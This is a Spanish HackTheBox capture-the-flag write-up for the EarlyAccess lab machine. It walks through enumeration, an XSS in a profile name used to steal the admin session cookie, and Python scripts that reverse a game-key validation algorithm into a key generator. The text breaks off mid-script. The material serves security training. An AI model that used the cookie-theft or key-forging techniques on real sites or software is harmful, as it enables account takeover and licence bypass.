<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Writeup EarlyAccess</title>
 <link rel="stylesheet" href="/assets/css/styles_machine.css" />
 <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
</head>
<body>
  <div class="menu">
    <div id="mySidepanel" class="sidepanel">
        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
        <a href="/htb">HackTheBox</a>
        <a href="/">Home</a>
        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
    </div>
    
    <button class="openbtn" onclick="openNav()">☰</button>  
</div>
<script>
function openNav() {
if (window.innerWidth <= 1000) {
    document.getElementById("mySidepanel").style.display = "block";
} else {
    document.getElementById("mySidepanel").style.width = "25%";
}
}

function closeNav() {
if (window.innerWidth <= 1000) {
    document.getElementById("mySidepanel").style.display = "none";
} else {
    document.getElementById("mySidepanel").style.width = "0";
}

}

</script>

  <div class="main">
<a href="https://app.hackthebox.com/machines/EarlyAccess" target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/EarlyAccess.png"/></a>
<h1 id="earlyaccess">EarlyAccess</h1>
<h2 id="enumeración">Enumeración</h2>
<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.11.110</strong>.</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>❯ <span class="fu">ping</span> -c 1 10.10.11.110</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">PING</span> 10.10.11.110 (10.10.11.110) <span class="ex">56</span>(84) <span class="ex">bytes</span> of data.</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">64</span> bytes from 10.10.11.110: icmp_seq=1 ttl=63 time=34.3 ms</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">---</span> 10.10.11.110 ping statistics ---</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">1</span> packets transmitted, 1 received, 0% packet loss, time 0ms</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">rtt</span> min/avg/max/mdev = 34.289/34.289/34.289/0.000 ms</span></code></pre></div>
<p>En el output del comando ejecutado en el parámetro <strong>ttl</strong> se ve que el valor está más cerca del <strong>64</strong> que del <strong>128</strong>, gracias a este parámetro se puede saber el sistema operativo que se está utilizando, en este caso un Linux.</p>
<table>
<thead>
<tr class="header">
<th>TTY</th>
<th>OS        </th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>64  </td>
<td>GNU/Linux</td>
</tr>
<tr class="even">
<td>128</td>
<td>Windows  </td>
</tr>
</tbody>
</table>
<p>Vamos a utilizar la herramienta <strong>Nmap</strong> para escanear los puertos que estén abiertos y servicios que están asociados a estos.</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a>❯ <span class="fu">nmap</span> -p- --open -sCV -n -Pn 10.10.11.110 -oN Scan</span></code></pre></div>
<table>
<colgroup>
<col style="width: 8%" />
<col style="width: 91%" />
</colgroup>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-p-</td>
<td>Indica que analice todos los puertos del 1 al 65535</td>
</tr>
<tr class="even">
<td>–open</td>
<td>Únicamente se escanearan los puertos que estén abiertos</td>
</tr>
<tr class="odd">
<td>-sC</td>
<td>Lanza scripts que tiene Nmap por defecto para detectar el tipo de servicio que este corriendo en un puerto</td>
</tr>
<tr class="even">
<td>-sV</td>
<td>Lanza scripts que tiene Nmap para saber que versión están utilizando los servicios</td>
</tr>
<tr class="odd">
<td>-n</td>
<td>Se evita realizar resolución DNS</td>
</tr>
<tr class="even">
<td>–min-rate</td>
<td>Indica la cantidad de paquetes que se envían por segundo, en este caso 5000</td>
</tr>
<tr class="odd">
<td>-Pn</td>
<td>Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos.</td>
</tr>
<tr class="even">
<td>-oN</td>
<td>Exporta el output del comando ejecutado a un archivo en formato nmap</td>
</tr>
</tbody>
</table>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.93 ( https://nmap.org ) <span class="ex">at</span> 2024-05-12 09:05 CEST</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 10.10.11.110</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Host</span> is up (0.038s latency)<span class="ex">.</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Not</span> shown: 65532 closed tcp ports (reset)</span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">PORT</span>    STATE SERVICE  VERSION</span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">22/tcp</span>  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">2048</span> e466288ed0bdf31df18d44e9141d9c64 (RSA)</span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> b3a8f4497a0379d35a1394249b6ad1bd (ECDSA)</span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 e9aaae594a3749a65a2a321d7926edbb (ED25519)</span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="ex">80/tcp</span>  open  http     Apache httpd 2.4.38</span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: Did not follow redirect to https://earlyaccess.htb/</span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: Apache/2.4.38 (Debian)</span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="ex">443/tcp</span> open  ssl/http Apache httpd 2.4.38 ((Debian))</span>
<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: EarlyAccess</span>
<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssl-cert</span>: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT</span>
<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2021-08-18T14:46:57</span>
<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2022-08-18T14:46:57</span>
<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">tls-alpn</span>: </span>
<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  http/1.1</span>
<span id="cb3-21"><a href="#cb3-21" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: Apache/2.4.38 (Debian)</span>
<span id="cb3-22"><a href="#cb3-22" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_ssl-date</span>: TLS randomness does not represent time</span>
<span id="cb3-23"><a href="#cb3-23" aria-hidden="true"></a><span class="ex">Service</span> Info: Host: 172.18.0.102<span class="kw">;</span> <span class="ex">OS</span>: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
<span id="cb3-24"><a href="#cb3-24" aria-hidden="true"></a></span>
<span id="cb3-25"><a href="#cb3-25" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span id="cb3-26"><a href="#cb3-26" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 33.11 seconds</span></code></pre></div>
<p>Los puertos que se han descubierto son:</p>
<table>
<thead>
<tr class="header">
<th>Puertos</th>
<th>Servicio</th>
<th style="text-align: center;">Versión</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>22</td>
<td>SSH</td>
<td style="text-align: center;">OpenSSH 7.9p1</td>
</tr>
<tr class="even">
<td>80</td>
<td>HTTP</td>
<td style="text-align: center;">Apache httpd 2.4.38</td>
</tr>
<tr class="odd">
<td>443</td>
<td>HTTPs</td>
<td style="text-align: center;">Apache httpd 2.4.38</td>
</tr>
</tbody>
</table>
<p>Utilizamos la herramienta <strong>whatweb</strong> para ver los gestores de contenido que utiliza y vemos que nos redirige al dominio <strong>earlyaccess.htb</strong>.</p>
<img src="Img/Pasted image 20240512092507.png">
<p>Por lo que para que nos redirija al dominio <strong>earlyaccess.htb</strong>, tenemos que hacerle saber al sistema que la IP <strong>10.10.11.110</strong> hace referencia a ese domino, y eso se puede conseguir indicándoselo en el archivo <strong>/etc/hosts</strong>.</p>
<img src="Img/Pasted image 20240512093051.png">
<p>Ahora si utilizamos de nuevo <strong>whatweb</strong> podemos ver el correo ya podemos ver el dominio, además podemos ver el correo <strong>admin@earlyaccess.htb</strong> .</p>
<img src="Img/Pasted image 20240512094909.png">
<img src="Img/Pasted image 20240512094921.png">
<h2 id="búsqueda-de-vulnerabilidades">Búsqueda de Vulnerabilidades</h2>
<p>Si accedemos a la pagina, vemos que nos redirige a <strong>://earlyaccess.htb</strong>.</p>
<img src="Img/Pasted image 20240512095606.png">
<p>Vemos un register y un login.</p>
<img src="Img/Pasted image 20240512095647.png">
<p>Nos creamos un usuario.</p>
<img src="Img/Pasted image 20240512100355.png">
<p>Accedemos.</p>
<img src="Img/Pasted image 20240512101240.png">
<img src="Img/Pasted image 20240512101302.png">
<p>Mirando las diferentes pestañas que tenemos vemos que hay una la cual es <strong>Register key</strong>.</p>
<img src="Img/Pasted image 20240512103149.png">
<p>Accediendo vemos que podemos pasar una clave de un juego.</p>
<img src="Img/Pasted image 20240512103223.png">
<p>Viendo por otras pestañas, vemos un comentario en la pestaña <strong>Forum</strong> donde se advierte que hay un error critico en el <strong>game-scoreboard</strong>, el cual indica que el nombre de usuario arroja errores extraños en el marcador de puntuación. Tengamos esto en cuenta para volver a comprobarlo más adelante.</p>
<img src="Img/Pasted image 20240512103906.png">
<p>Accediendo a la pestaña <strong>Messaging</strong> vemos que podemos enviar un mensaje al correo <strong>admin@earlyaccess.htb</strong> el cual seguramente sea el usuario <strong>admin</strong> de la pagina.</p>
<img src="Img/Pasted image 20240512121759.png">
<p>Al enviar el mensaje vemos nos pone que el mensaje será leído por el usuario <strong>admin</strong>.</p>
<img src="Img/Pasted image 20240512121929.png">
<p>Si le damos ha <strong>message to: admin</strong> nos aparece el mensaje junto con nuestro nombre de usuario.</p>
<img src="Img/Pasted image 20240512122400.png">
<p>Y al esperar un poco vemos que el mensaje fue enviado al usuario <strong>admin</strong>.</p>
<img src="Img/Pasted image 20240512123146.png">
<p>Si editamos nuestro perfil y en el campo de <strong>Name</strong>, que es lo que aparece en el mensaje, y tratamos de realizar un <strong>HTML injection</strong>.</p>
<img src="Img/Pasted image 20240512123321.png">
<p>Al enviar otro mensaje</p>
<img src="Img/Pasted image 20240512123406.png">
<p>Vemos que nos lo interpreta</p>
<img src="Img/Pasted image 20240512123442.png">
<p>Vamos a tratar de realizar un <strong>XSS</strong>.</p>
<img src="Img/Pasted image 20240512123651.png">
<p>Al enviar otro mensaje y acceder a este, vemos que nos salta una ventana emergente</p>
<img src="Img/Pasted image 20240512123747.png">
<p>Por tanto viendo esto podemos ver que la pagina es vulnerable a un <strong>XSS</strong>.</p>
<p>Sabiendo esto tratamos de ver nuestra cookie de sesión en la ventana emergente.</p>
<img src="Img/Pasted image 20240512123848.png">
<p>Y al enviar un nuevo mensaje vemos que nos aparece la ventana emergente con nuestra <strong>cookie de sesión</strong>.</p>
<img src="Img/Pasted image 20240512124037.png">
<p>Vemos que la cookie de sesión esta compuesta por <strong>XSRF-TOKEN</strong> y <strong>earlyaccess_session</strong>.</p>
<img src="Img/Pasted image 20240512124153.png">
<p>Teniendo esto en mente podemos tratar de robar la cookie de sesión del usuario <strong>admin</strong>.</p>
<img src="Img/Pasted image 20240512124439.png">
<p>Y para recibir la cookie creamos un servidor HTTP</p>
<img src="Img/Pasted image 20240512124339.png">
<p>Esperando un rato tras enviar el mensaje, nos aparece la <strong>cookie</strong> del usuario <strong>admin</strong>.</p>
<img src="Img/Pasted image 20240512130723.png">
<p>Cambiamos nuestra <strong>cookie</strong> por la nueva.</p>
<img src="Img/Pasted image 20240512130911.png">
<p>Y al recargar de nuevo la pagina nos fijamos que ahora somos el usuario <strong>admin</strong>.</p>
<img src="Img/Pasted image 20240512130938.png">
<p>Vemos 3 nuevas pestañas <strong>Admin</strong>, <strong>Dev</strong> y <strong>Game</strong>.</p>
<img src="Img/Pasted image 20240512131029.png">
<p>Al acceder a <strong>Game</strong> vemos que nos redirige al subdominio <strong>game.earlyaccess.htb</strong> por tanto lo añadimos al <strong>/etc/hosts</strong>.</p>
<img src="Img/Pasted image 20240512131910.png">
<img src="Img/Pasted image 20240512131837.png">
<p>Ya pudiendo acceder al subdominio vemos que nos pide acceder con una cuenta que haya <strong>canjeado</strong> alguna <strong>clave</strong> de juego.</p>
<img src="Img/Pasted image 20240512132016.png">
<p>Otra de la pestañas es <strong>Dev</strong> donde nos redirige al subdominio <strong>dev.earlyaccess.htb</strong>.</p>
<img src="Img/Pasted image 20240512142854.png">
<img src="Img/Pasted image 20240512142920.png">
<p>Añadimos el subdominio al <strong>/etc/hosts</strong>.</p>
<img src="Img/Pasted image 20240512143030.png">
<p>Al acceder vemos que nos pide la contraseña del usuario <strong>admin</strong>, la cual no tenemos conocimiento de ella.</p>
<img src="Img/Pasted image 20240512143118.png">
<p>Al acceder a <strong>Admin</strong> y mirar dentro de <strong>Download backup</strong> vemos que podemos descargar un <strong>backup</strong> offline del algoritmo de validación de las claves.</p>
<img src="Img/Pasted image 20240512143249.png">
<img src="Img/Pasted image 20240512143217.png">
<p>Vemos también la parte offline de la verificación de claves.</p>
<img src="Img/Pasted image 20240512143817.png">
<p>Nos descargamos el algoritmo de validación offline de las claves, y descomprimimos el <strong>.zip</strong>.</p>
<img src="Img/Pasted image 20240512144116.png">
<p>Mirando el algoritmos de validación.</p>
<img src="Img/Pasted image 20240512144456.png">
<p>Sabemos el patrón alfanumérico que debe tener la clave.</p>
<img src="Img/Pasted image 20240512144338.png">
<p>Vemos que la clave la separa por partes.</p>
<img src="Img/Pasted image 20240512145117.png">
<img src="Img/Pasted image 20240512145643.png">
<p>En la función <strong>g1_valid</strong> vemos que esta añadiendo la primera parte de la clave.</p>
<img src="Img/Pasted image 20240512145745.png">
<p>Para validar si esa parte es valida, con el bucle pilla los 3 primeros caracteres guardándolos en la variable <strong>v</strong> y en la variable <strong>i</strong> guarda la posición.</p>
<img src="Img/Pasted image 20240512150344.png">
<p>Luego con las variables ya creadas convierte el valor de <strong>v</strong> en decimal con el <strong>ord()</strong>.</p>
<img src="Img/Pasted image 20240512150426.png">
<p>Para luego utilizar la operatoria left shift <strong>&lt;&lt;</strong> para desplazar los bits de un número hacia la izquierda por un número especifico de posiciones, en este caso el numero de posiciones es <strong>0+1=1</strong>.</p>
<img src="Img/Pasted image 20240512150650.png">
<p>Para el caso de la letra <strong>A</strong> el resultado es <strong>130</strong>.</p>
<img src="Img/Pasted image 20240512150711.png">
<p>Ej:</p>
<p>En este caso tenemos el numero 5 el cual queremos desplazar los bits hacia la izquierda 1 posición, y como resultado da 10.</p>
<img src="Img/Pasted image 20240512150800.png">
<p>la representación del numero 5 en binario es <strong>0101</strong>.</p>
<img src="Img/Pasted image 20240512151015.png">
<p>Pero como le estamos diciendo que nos desplace a la izquierda los bits <strong>1</strong> posición, el valor final queda en <strong>10</strong>.</p>
<img src="Img/Pasted image 20240512151126.png">
<p>Es por eso que al realizar la operatoria el resultado es <strong>130</strong>.</p>
<img src="Img/Pasted image 20240512151559.png">
<img src="Img/Pasted image 20240512151303.png">
<p>Luego de esa operatoria realiza un <strong>% 256</strong>, que seria el resto de la división entre el resultado de la operatoria del <strong>ord()</strong> y el numero <strong>256</strong>.</p>
<img src="Img/Pasted image 20240512151828.png">
<img src="Img/Pasted image 20240512151835.png">
<p>Para luego al valor resultante, realizar un XOR <strong>^</strong> al valor en decimal de la variable <strong>v</strong>.</p>
<img src="Img/Pasted image 20240512163016.png">
<img src="Img/Pasted image 20240512163025.png">
<p>Luego de esas operatorias comprueba si los valores que se han guardado en la variable <strong>r</strong> son diferentes a <strong>221, 81, 145</strong> en ese orden, y en el caso de que lo sean devolverá <strong>false</strong>.</p>
<img src="Img/Pasted image 20240512163222.png">
<p>Por tanto lo que tenemos que hacer es tratar de saber cuales son los valores que necesitamos para que el resultado sea <strong>221, 81, 145</strong> por tanto vamos a crear un script en Python el cual nos indique cuales son los 3 primeros valores que se necesitan para que los 3 resultados sean <strong>221,81, 145</strong>.</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3  </span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="im">import</span> string  </span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a><span class="im">import</span> sys  </span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a>  </span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a>i <span class="op">=</span> <span class="bu">int</span>(sys.argv[<span class="dv">1</span>])  </span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a>  </span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a><span class="cf">for</span> v <span class="kw">in</span> string.ascii_uppercase<span class="op">+</span>string.digits:  </span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a>    value <span class="op">=</span> (<span class="bu">ord</span>(v)<span class="op">&lt;&lt;</span>i<span class="op">+</span><span class="dv">1</span>)<span class="op">%</span><span class="dv">256</span><span class="op">^</span><span class="bu">ord</span>(v)  </span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="ss">f&quot;</span><span class="sc">{v}</span><span class="ss">: </span><span class="sc">{</span>value<span class="sc">}</span><span class="ss">&quot;</span>)</span></code></pre></div>
<img src="Img/Pasted image 20240512163359.png">
<p>Vemos que los 3 primeros caracteres de la key deben ser <strong>KEY</strong>.</p>
<img src="Img/Pasted image 20240512163526.png">
<p>Luego de esa validación comprueba si los 2 últimos valores son números, por tanto, podemos poner el número que nosotros queramos, pero que no sean repetidos, ya que está el <strong>set()</strong> de por medio.</p>
<img src="Img/Pasted image 20240512163702.png">
<img src="Img/Pasted image 20240512163709.png">
<p>Con la primera función del primer elemento de la clave explicado pasamos a la función <strong>g2_valid</strong>.</p>
<img src="Img/Pasted image 20240512163850.png">
<p>Vemos que en la variable <strong>p1</strong> esta pillando el <strong>g2</strong> y realizando una secuencia de 2 saltos empezando por el primer valor de <strong>g2</strong>.</p>
<img src="Img/Pasted image 20240512163949.png">
<p>Y luego en la variable <strong>p2</strong> realiza la misma secuencia de 2 saltos pero empezando por la segunda posición.</p>
<img src="Img/Pasted image 20240512164028.png">
<p>Para finalmente convertir los valores en decimal y ver si son iguales.</p>
<img src="Img/Pasted image 20240512164042.png">
<p>Por tanto, lo que vamos a hacer es crear un script el cual nos diga cuáles son los valores necesarios para que el resultado sea <strong>True</strong>.</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3  </span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="im">import</span> string  </span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="im">import</span> random  </span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>  </span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a>characters <span class="op">=</span> string.ascii_uppercase <span class="op">+</span> string.digits  </span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a>  </span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a>rep <span class="op">=</span> []  </span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a>  </span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a><span class="cf">while</span> <span class="va">True</span>:  </span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a>  </span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>    r <span class="op">=</span> random.sample(characters, <span class="dv">5</span>)  </span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a>  </span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a>    key <span class="op">=</span> <span class="st">&#39;&#39;</span>.join(r)  </span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a>  </span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a>    <span class="cf">if</span> key <span class="kw">not</span> <span class="kw">in</span> rep:  </span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a>        <span class="cf">if</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(key[::<span class="dv">2</span>].encode())) <span class="op">==</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(key[<span class="dv">1</span>::<span class="dv">2</span>].encode())):  </span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a>            <span class="bu">print</span>(key)  </span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a>            rep.append(key)</span></code></pre></div>
<p>Al ejecutar el script nos muestra todos los valores los cuales sus resultados son iguales.</p>
<img src="Img/Pasted image 20240512164201.png">
<p>Con esto ya explicado pasamos a la función <strong>g3_valid</strong>.</p>
<img src="Img/Pasted image 20240512164415.png">
<p>Lo primero que hace es validar si los dos primeros caracteres de la tercera parte de la clave son iguales al valor de la variable <strong>magic_value</strong>.</p>
<p>Y vemos que el valor de la variable <strong>magic_value</strong> es <strong>XP</strong>-</p>
<img src="Img/Pasted image 20240512164526.png">
<p>Entonces si o si la tercera parte de la clave tiene que empezar por <strong>XP</strong>.</p>
<p>Luego de esa comparación, de nuevo realiza otra donde compara si la sumatoria de todos los caracteres en decimal de la tercera parte de la clave es igual al valor de <strong>magic_num</strong>, es decir <strong>346</strong>.</p>
<img src="Img/Pasted image 20240512164707.png">
<img src="Img/Pasted image 20240512164835.png">
<p>Pero como el valor de <strong>magic_num</strong> irá cambiando con el tiempo tendremos que crear un script donde guarde todas las posibles combinatorias únicas que al sumarlas den el valor del <strong>magic_num</strong>.</p>
<p>Ya que habrán ocasiones en las que el valor se repita.</p>
<img src="Img/Pasted image 20240512165016.png">
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3  </span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="im">import</span> string  </span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="im">from</span> itertools <span class="im">import</span> product  </span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a>  </span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>r <span class="op">=</span> product(string.ascii_uppercase, repeat<span class="op">=</span><span class="dv">2</span>)  </span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a>  </span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a>r2 <span class="op">=</span> [ <span class="st">&quot;&quot;</span>.join(x) <span class="cf">for</span> x <span class="kw">in</span> r ]  </span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a>  </span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a>  </span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a>com <span class="op">=</span> {}  </span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>  </span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a><span class="cf">for</span> x <span class="kw">in</span> r2:  </span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>,<span class="dv">10</span>):  </span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a>        key <span class="op">=</span> <span class="ss">f&quot;XP</span><span class="sc">{x}{i}</span><span class="ss">&quot;</span>  </span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a>  </span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>        value <span class="op">=</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(key.encode()))  </span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a>  </span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a>        com[value] <span class="op">=</span> key  </span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a>  </span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a><span class="bu">print</span>(com)</span></code></pre></div>
<img src="Img/Pasted image 20240512165322.png">
<p>Con esto ya explicado pasamos a la función <strong>g4_valid</strong>.</p>
<img src="Img/Pasted image 20240512165202.png">
<p>Vemos que esta recorriendo la primera parte de la clave y guardando el resultado en la variable <strong>g</strong> y recorriendo la tercera parte de la clave, guardando el resultado en la variable <strong>i</strong>.</p>
<img src="Img/Pasted image 20240512165421.png">
<img src="Img/Pasted image 20240512165427.png">
<p>Luego con cada iteración que va haciendo realiza un <strong>XOR</strong> de los valores en decimal.</p>
<img src="Img/Pasted image 20240512165515.png">
<p>Para luego comparar si el resultado es igual al que se espera.</p>
<img src="Img/Pasted image 20240512165550.png">
<p>Pero lo curioso aquí es que XOR es reversible</p>
<p>Ej:</p>
<p>En este caso queremos pillar el primer carácter, pero solo sabemos que el resultado es <strong>12</strong>, pero aplicando un <strong>XOR</strong> de 12 y el carácter que sabemos <strong>K</strong>, nos devuelve en decimal el valor restante.</p>
<img src="Img/Pasted image 20240512165719.png">
<p>Sabiendo esto, podemos saber los demás valores.</p>
<img src="Img/Pasted image 20240512165940.png">
<p>Con esto ya explicado nos vamos a la función <strong>cs_valid</strong> la cual valida el <strong>checksum</strong>.</p>
<img src="Img/Pasted image 20240512170010.png">
<p>Vemos que esta pillando la ultima parte de la clave.</p>
<p>Para luego compararlo con el resultado de la función <strong>calc_cs</strong>.</p>
<img src="Img/Pasted image 20240512170048.png">
<p>En el cual esta consiguiendo todas las partes de la clave menos la ultima, para luego realizar una suma de todas las partes.</p>
<img src="Img/Pasted image 20240512170225.png">
<p>Con todo esto ya explicado, ya nos podemos hacer una idea de como será el patrón de la clave.</p>
<img src="Img/Pasted image 20240512170235.png">
<p>Ya con todo esto explicado procedemos a crear el generador de claves.</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3  </span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="im">import</span> string  </span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a><span class="im">from</span> itertools <span class="im">import</span> product  </span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="im">import</span> time  </span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a><span class="im">import</span> requests  </span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a><span class="im">import</span> re  </span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span>  </span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a>  </span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a>  </span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a>requests.packages.urllib3.disable_warnings()  </span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true"></a>  </span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true"></a><span class="co"># variables globles  </span></span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true"></a><span class="co">#url_key = &quot;https://earlyaccess.htb/key&quot;  </span></span>
<span id="cb7-14"><a href="#cb7-14" aria-hidden="true"></a>s <span class="op">=</span> requests.session()  </span>
<span id="cb7-15"><a href="#cb7-15" aria-hidden="true"></a>email <span class="op">=</span> <span class="st">&quot;pr1ngl3s@pr1ngl3s.com&quot;</span>  </span>
<span id="cb7-16"><a href="#cb7-16" aria-hidden="true"></a>password <span class="op">=</span> <span class="st">&quot;pr1ngl3s123&quot;</span>  </span>
<span id="cb7-17"><a href="#cb7-17" aria-hidden="true"></a>url_key <span class="op">=</span> <span class="st">&quot;https://earlyaccess.htb/key&quot;</span>  </span>
